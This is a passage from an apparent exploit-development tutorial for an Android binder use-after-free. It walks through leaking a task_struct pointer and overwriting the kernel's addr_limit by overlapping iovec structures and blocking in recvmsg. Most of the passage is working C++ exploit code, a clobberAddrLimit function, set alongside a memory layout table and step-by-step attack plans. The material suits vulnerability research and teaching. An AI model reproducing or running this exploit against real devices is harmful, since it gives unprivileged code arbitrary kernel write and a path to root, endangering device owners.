    m_task_struct <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>dataBuffer <span class="token operator">+</span> TASK_STRUCT_OFFSET_IN_LEAKED_DATA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    m_pidAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> m_task_struct <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    m_credAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> m_task_struct <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span><span class="token punctuation">,</span> cred<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    m_nsproxyAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> m_task_struct <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span><span class="token punctuation">,</span> nsproxy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Leaked task_struct: %p\n&quot;</span><span class="token punctuation">,</span> m_task_struct<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] &amp;task_struct-&gt;pid: %p\n&quot;</span><span class="token punctuation">,</span> m_pidAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] &amp;task_struct-&gt;cred: %p\n&quot;</span><span class="token punctuation">,</span> m_credAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] &amp;task_struct-&gt;nsproxy: %p\n&quot;</span><span class="token punctuation">,</span> m_nsproxyAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>I hope know you have a better idea what&apos;s going on and how in-flight <code>iovec</code> structure was used for leaking <code>task_struct</code> pointer.</p>
<h2 id="clobber-addr-limit">Clobber addr_limit </h2>
<p>We have leaked <code>task_struct</code> pointer, now it&apos;s time to clobber <code>mm_segment_t addr_limit</code>.</p>
<p>We can&apos;t use <code>writev</code> because we do not want to achieve <strong>scoped read</strong> but instead we want <strong>scoped write</strong> to <strong>kernel space</strong>. Initially I tried <code>readv</code> blocking feature to achieve the <strong>scoped write</strong> but I found few issue because of which we can not use it.</p>
<p>Below given are some of the reasons</p>
<ul>
<li><code>readv</code> will not process <strong>one</strong> <code>iovec</code> and block like <code>writev</code> calls does </li>
<li>when <code>iovecStack[10].iov_len</code> is clobbered with a pointer, the length is now a big number and when <code>copy_page_to_iter_iovec</code> function tries to copy the data by processing the <code>iovec</code> structure stack, it fails.</li>
</ul>
<p>Let&apos;s open <code>workshop/android-4.14-dev/goldfish/lib/iov_iter.c</code> and see the implementation of <code>copy_page_to_iter_iovec</code> function.</p>
<pre class="language-"><code class="lang-c"><span class="token keyword">static</span> size_t <span class="token function">copy_page_to_iter_iovec</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">,</span> size_t offset<span class="token punctuation">,</span> size_t bytes<span class="token punctuation">,</span>
                         <span class="token keyword">struct</span> <span class="token class-name">iov_iter</span> <span class="token operator">*</span>i<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        size_t skip<span class="token punctuation">,</span> copy<span class="token punctuation">,</span> left<span class="token punctuation">,</span> wanted<span class="token punctuation">;</span>
        <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">;</span>
        <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token operator">*</span>kaddr<span class="token punctuation">,</span> <span class="token operator">*</span>from<span class="token punctuation">;</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>left <span class="token operator">&amp;&amp;</span> bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                iov<span class="token operator">++</span><span class="token punctuation">;</span>
                buf <span class="token operator">=</span> iov<span class="token operator">-&gt;</span>iov_base<span class="token punctuation">;</span>
                copy <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> iov<span class="token operator">-&gt;</span>iov_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
                left <span class="token operator">=</span> <span class="token function">copyout</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> from<span class="token punctuation">,</span> copy<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> wanted <span class="token operator">-</span> bytes<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li>when it tries to process the clobbered <code>iovecStack[10]</code>, it tries to compute the length of the copy in this line <code>copy = min(bytes, iov-&gt;iov_len)</code></li>
<li><code>bytes</code> is equal to sum of all the <code>iov_len</code> in the <code>iovecStack</code> and <code>iov-&gt;iov_len</code> is the <code>iovecStack[10].iov_len</code> which is now clobbered with a pointer</li>
<li>this is where things <strong>go wrong</strong> because, now length becomes <code>copy = bytes</code> and skips the processing of <code>iovecStack[11]</code> which would have given us the <strong>scoped write</strong></li>
</ul>
<p>For achieving <strong>scoped write</strong>, we are going to use <code>recvmsg</code> system call to <strong>block</strong> by passing <code>MSG_WAITALL</code> as the flag parameter. <code>recvmsg</code> system call can block just like <code>writev</code> system call and would would not encounter the issue we discussed with <code>readv</code> system call.</p>
<p>Let&apos;s see what we want to write to <code>addr_limit</code> field.</p>
<pre class="language-"><code>gef&gt; p sizeof(mm_segment_t) 
$17 = 0x8
</code></pre><p>As the size of <code>mm_segment_t</code> is <strong>0x8</strong> bytes, we would want to clobber it with <code>0xFFFFFFFFFFFFFFFE</code> as it&apos;s the highest valid <strong>kernel space</strong> address and will not crash the process if <strong>page fault</strong> occurs in <strong>arm64</strong> system.</p>
<p>Now, let&apos;s see how we will overlap <code>binder_thread</code> structure chunk with <code>iovec</code> structure stack in this case.   </p>
<table>
<thead>
<tr>
<th>offset</th>
<th>binder_thread</th>
<th>iovecStack</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>...</td>
<td>iovecStack[0].iov_base = 0x0000000000000000</td>
</tr>
<tr>
<td>0x08</td>
<td>...</td>
<td>iovecStack[0].iov_len = 0x0000000000000000</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr>
<td>0xA0</td>
<td>wait.lock</td>
<td>iovecStack[10].iov_base = m_4gb_aligned_page</td>
</tr>
<tr>
<td>0xA8</td>
<td>wait.head.next</td>
<td>iovecStack[10].iov_len = 1</td>
</tr>
<tr>
<td>0xB0</td>
<td>wait.head.prev</td>
<td>iovecStack[11].iov_base = 0x41414141</td>
</tr>
<tr>
<td>0xB8</td>
<td>...</td>
<td>iovecStack[11].iov_len = 0x8 + 0x8 + 0x8 + 0x8</td>
</tr>
<tr>
<td>0xC0</td>
<td>...</td>
<td>iovecStack[12].iov_base = 0x42424242</td>
</tr>
<tr>
<td>0xC8</td>
<td>...</td>
<td>iovecStack[12].iov_len = 0x8</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>Again, <code>iovecStack[10].iov_len</code> and <code>iovecStack[11].iov_base</code> will be clobbered with a pointer. However, we will only trigger the <strong>unlink</strong> operation, when <code>iovecStack[10]</code> is already processed and <code>recvmsg</code> system call is blocking and waiting to receive the rest of the messages.</p>
<p>When the clobber is done, we will write rest of the data (<code>finalSocketData</code>) to the socket file descriptor and then <code>recvmsg</code> system call will resume automatically.</p>
<pre class="language-"><code class="lang-c"><span class="token keyword">static</span> uint64_t finalSocketData<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">0x1</span><span class="token punctuation">,</span>                    <span class="token comment">// iovecStack[IOVEC_WQ_INDEX].iov_len</span>
        <span class="token number">0x41414141</span><span class="token punctuation">,</span>             <span class="token comment">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base</span>
        <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span>  <span class="token comment">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len</span>
        <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span> m_task_struct <span class="token operator">+</span>
                    OFFSET_TASK_STRUCT_ADDR_LIMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base</span>
        <span class="token number">0xFFFFFFFFFFFFFFFE</span>      <span class="token comment">// addr_limit value</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>Let&apos;s see what will happen after clobber</p>
<ul>
<li><code>iovecStack[10]</code> is already processed before we trigger the <strong>unlink</strong> operation</li>
<li><code>iovecStack[10].iov_len</code> and <code>iovecStack[11].iov_base</code> is clobbered with a pointer</li>
<li>when <code>recvmsg</code> starts processing <code>iovecStack[11]</code><ul>
<li>it will write <code>1</code> to <code>iovecStack[10].iov_len</code> which was earlier clobbered, basically fix it back to it&apos;s initial value</li>
<li>write <code>0x41414141</code> to <code>iovecStack[11].iov_base</code></li>
<li>write <code>0x20</code> to <code>iovecStack[11].iov_len</code></li>
<li>write address of <code>addr_limit</code> to <code>iovecStack[12].iov_base</code></li>
</ul>
</li>
<li>now, when <code>recvmsg</code> starts processing <code>iovecStack[12]</code><ul>
<li>write <code>0xFFFFFFFFFFFFFFFE</code> to <code>addr_limit</code></li>
</ul>
</li>
</ul>
<p>This is how we will convert <strong>scoped write</strong> to controlled <strong>arbitrary write</strong>.</p>
<p>Let&apos;s build the attack plan to clobber <code>addr_limit</code></p>
<ul>
<li>create <code>socketpair</code> and get the file descriptors</li>
<li>write <strong>0x1</strong> byte of junk data to socket&apos;s write descriptor</li>
<li>link <code>eventpoll</code> wait queue to <code>binder_thread</code> wait queue</li>
<li><code>fork</code> the process<ul>
<li>parent process<ul>
<li>free the <code>binder_thread</code> structure</li>
<li>trigger <code>recvmsg</code> system call, it will process the <strong>0x1</strong> byte of junk data that we wrote, then blocks and waits to receive rest of the data</li>
<li>once <code>recvmsg</code> system call resumes, it will process <code>iovecStack[11]</code> which is already clobbered due to <strong>unlink</strong> operation</li>
<li>once <code>recvmsg</code> system call returns it would have clobbered <code>addr_limit</code></li>
</ul>
</li>
<li>child process<ul>
<li><code>sleep</code> to avoid race conditions</li>
<li>trigger the <strong>unlink</strong> operation</li>
<li>write rest of the data <code>finalSocketData</code> to the socket&apos;s write descriptor</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Now, let&apos;s see the how the same could be achieved in the exploit code.</p>
<pre class="language-"><code class="lang-cpp"><span class="token keyword">void</span> <span class="token class-name">BinderUaF</span><span class="token operator">::</span><span class="token function">clobberAddrLimit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> sock_fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    ssize_t nBytesWritten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">msghdr</span> message <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">nullptr</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iovecStack<span class="token punctuation">[</span>IOVEC_COUNT<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">nullptr</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get binder fd</span>
    <span class="token comment">//</span>

    <span class="token function">setupBinder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Create event poll</span>
    <span class="token comment">//</span>

    <span class="token function">setupEventPoll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// For clobbering the addr_limit we trigger the unlink</span>
    <span class="token comment">// operation again after reallocating binder_thread with</span>
    <span class="token comment">// iovecs</span>
    <span class="token comment">//</span>
    <span class="token comment">// If you see how we manage to leak kernel data is by using</span>
    <span class="token comment">// the blocking feature of writev</span>
    <span class="token comment">//</span>
    <span class="token comment">// We could use readv blocking feature to do scoped write</span>
    <span class="token comment">// However, after trying readv and reading the Linux kernel</span>
    <span class="token comment">// code, I figured out an issue which makes readv useless for</span>
    <span class="token comment">// current bug.</span>
    <span class="token comment">//</span>
    <span class="token comment">// The main issue that I found is:</span>
    <span class="token comment">//</span>
    <span class="token comment">// iovcArray[IOVEC_COUNT].iov_len is clobbered with a pointer</span>
    <span class="token comment">// due to unlink operation</span>
    <span class="token comment">//</span>
    <span class="token comment">// So, when copy_page_to_iter_iovec tries to process the iovecs,</span>
    <span class="token comment">// there is a line of code, copy = min(bytes, iov-&gt;iov_len);</span>
    <span class="token comment">// Here, &quot;bytes&quot; is equal to sum of all iovecs length and as</span>
    <span class="token comment">// &quot;iov-&gt;iov_len&quot; is corrupted with a pointer which is obviously</span>
    <span class="token comment">// a very big number, now copy = sum of all iovecs length and skips</span>
    <span class="token comment">// the processing of the next iovec which is the target iovec which</span>
    <span class="token comment">// would give was scoped write.</span>
    <span class="token comment">//</span>
    <span class="token comment">// I believe P0 also faced the same issue so they switched to recvmsg</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// Setup socketpair for iovec</span>
    <span class="token comment">//</span>
    <span class="token comment">// AF_UNIX/AF_LOCAL is used because we are interested only in</span>
    <span class="token comment">// local communication</span>
    <span class="token comment">//</span>
    <span class="token comment">// We use SOCK_STREAM so that MSG_WAITALL can be used in recvmsg</span>
    <span class="token comment">//</span>

    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Setting up socket\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sock_fd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] Unable to create socketpair\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] Socketpair created successfully\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// We will just write junk data to socket so that when recvmsg</span>
    <span class="token comment">// is called it process the fist valid iovec with this junk data</span>
    <span class="token comment">// and then blocks and waits for the rest of the data to be received</span>
    <span class="token comment">//</span>

    <span class="token keyword">static</span> <span class="token keyword">char</span> junkSocketData<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token number">0x41</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Writing junk data to socket\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    nBytesWritten <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>sock_fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>junkSocketData<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>junkSocketData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytesWritten <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>junkSocketData<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\n&quot;</span><span class="token punctuation">,</span> nBytesWritten<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>junkSocketData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Write junk data to the socket so that when recvmsg is</span>
    <span class="token comment">// called, it process the first valid iovec with this junk</span>
    <span class="token comment">// data and then blocks for the rest of the incoming socket data</span>
    <span class="token comment">//</span>

    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Setting up iovecs\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// We want to block after processing the iovec at IOVEC_WQ_INDEX,</span>
    <span class="token comment">// because then, we can trigger the unlink operation and get the</span>
    <span class="token comment">// next iovecs corrupted to gain scoped write.</span>
    <span class="token comment">//</span>

    <span class="token function">mmap4gbAlignedPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_base <span class="token operator">=</span> m_4gb_aligned_page<span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_base <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0x41414141</span><span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_base <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0x42424242</span><span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token number">0x8</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Prepare the data buffer that will be written to socket</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64</span>
    <span class="token comment">// will result in crash because of a check in do_page_fault</span>
    <span class="token comment">// However, x86_64 does not have this check. But it&apos;s better</span>
    <span class="token comment">// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can</span>
    <span class="token comment">// be used in arm64 as well.</span>
    <span class="token comment">//</span>

    <span class="token keyword">static</span> <span class="token keyword">uint64_t</span> finalSocketData<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token number">0x1</span><span class="token punctuation">,</span>                    <span class="token comment">// iovecStack[IOVEC_WQ_INDEX].iov_len</span>
            <span class="token number">0x41414141</span><span class="token punctuation">,</span>             <span class="token comment">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base</span>
            <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span>  <span class="token comment">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len</span>
            <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> m_task_struct <span class="token operator">+</span>
                        OFFSET_TASK_STRUCT_ADDR_LIMIT<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base</span>
            <span class="token number">0xFFFFFFFFFFFFFFFE</span>      <span class="token comment">// addr_limit value</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Prepare the message</span>
    <span class="token comment">//</span>

    message<span class="token punctuation">.</span>msg_iov <span class="token operator">=</span> iovecStack<span class="token punctuation">;</span>
    message<span class="token punctuation">.</span>msg_iovlen <span class="token operator">=</span> IOVEC_COUNT<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Now link the poll wait queue to binder thread wait queue</span>
    <span class="token comment">//</span>

    <span class="token function">linkEventPollWaitQueueToBinderThreadWaitQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// We should trigger the unlink operation when we</span>
    <span class="token comment">// have the binder_thread reallocated as iovec array</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// Now fork</span>
    <span class="token comment">//</span>

    pid_t childPid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>childPid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//</span>
        <span class="token comment">// child process</span>
        <span class="token comment">//</span>

        <span class="token comment">//</span>
        <span class="token comment">// There is a race window between the unlink and blocking</span>
        <span class="token comment">// in writev, so sleep for a while to ensure that we are</span>
        <span class="token comment">// blocking in writev before the unlink happens</span>
        <span class="token comment">//</span>

        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// Trigger the unlink operation on the reallocated chunk</span>
        <span class="token comment">//</span>

        <span class="token function">unlinkEventPollWaitQueueFromBinderThreadWaitQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len</span>
        <span class="token comment">// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered</span>
        <span class="token comment">//</span>
        <span class="token comment">// Write rest of the data to the socket so that recvmsg starts</span>
        <span class="token comment">// processing the corrupted iovecs and we get scoped write and</span>
        <span class="token comment">// finally arbitrary write</span>
        <span class="token comment">//</span>

        nBytesWritten <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>sock_fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> finalSocketData<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>finalSocketData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytesWritten <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>finalSocketData<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&quot;</span><span class="token punctuation">,</span> nBytesWritten<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>finalSocketData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// parent process</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// I have seen some races which hinders the reallocation.</span>
    <span class="token comment">// So, now freeing the binder_thread after fork.</span>
    <span class="token comment">//</span>

    <span class="token function">freeBinderThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Reallocate binder_thread as iovec array and</span>
    <span class="token comment">// we need to make sure this recvmsg call blocks.</span>
    <span class="token comment">//</span>
    <span class="token comment">// recvmsg will block after processing a valid iovec at</span>
    <span class="token comment">// iovecStack[IOVEC_WQ_INDEX]</span>
    <span class="token comment">//</span>

    ssize_t nBytesReceived <span class="token operator">=</span> <span class="token function">recvmsg</span><span class="token punctuation">(</span>sock_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>message<span class="token punctuation">,</span> MSG_WAITALL<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// If the corruption was successful, the total bytes received</span>
    <span class="token comment">// should be equal to length of all iovec. This is because there</span>
    <span class="token comment">// are three valid iovec</span>
    <span class="token comment">//</span>

    ssize_t expectedBytesReceived <span class="token operator">=</span> iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">+</span>
                                    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">+</span>
                                    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytesReceived <span class="token operator">!=</span> expectedBytesReceived<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx\n&quot;</span><span class="token punctuation">,</span> nBytesReceived<span class="token punctuation">,</span> expectedBytesReceived<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
